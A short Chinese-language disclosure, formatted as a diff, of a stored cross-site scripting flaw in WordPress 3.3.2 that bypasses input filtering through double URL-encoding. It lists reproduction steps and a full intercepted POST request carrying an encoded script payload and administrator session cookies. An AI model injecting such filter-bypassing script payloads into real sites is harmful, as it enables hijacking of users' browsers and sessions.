@@ -1,0 +1,28 @@
+WordPress 3.3.2鸡肋存储型跨站漏洞
+
+WordPress最新版本3.3.2存在一个双字节编码的存储型跨站漏洞，可以bypass内置的filter机制，但是利用起来有点鸡肋，细节如下：
+ 1：登录管理账户
+ 2：单击分类
+ 3：填写跨站参数，并用burp suite拦截请求
+ 4：输入%253cscript%253ealert%25281%2529%253c%252fscript%253e可以直接bypass。BURP请求数据包：
+ POST /wordpress/wp-admin/edit-tags.php HTTP/1.1
+ Host: localhost
+ User-Agent: Mozilla/5.0 (X11; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0
+ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+ Accept-Language: en-us,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Proxy-Connection: keep-alive
+ Referer:
+  
+ 
+http://seay.sinaapp.com/wordpress/wp-admin/edit-tags.php?action=edit&taxonomy=link_category&tag_ID=2&post_type=post
+ 
+ 
+ Cookie:
+ wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1335544051%7C197b22093eaefaf6950bd81d6aa6372b;
+ wp-settings-time-1=1335371272; wordpress_test_cookie=WP+Cookie+check;
+ wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1335544051%7C6ebcb9d0104a37c6d7a91274ac94c6cb
+ Content-Type: application/x-www-form-urlencoded
+ Content-Length: 379
+  
+ action=editedtag&tag_ID=2&taxonomy=link_category&_wp_original_http_referer=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fedit-tags.php%3Ftaxonomy%3Dlink_category&_wpnonce=83974d7f8f&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fedit-tags.php%3Faction%3Dedit%26taxonomy%3Dlink_category%26tag_ID%3D2%26post_type%3Dpost&name=Blogroll&slug=injecthere%253cscript%253ealert%25281%2529%253c%252fscript%253e&description=sectest&submit=Update
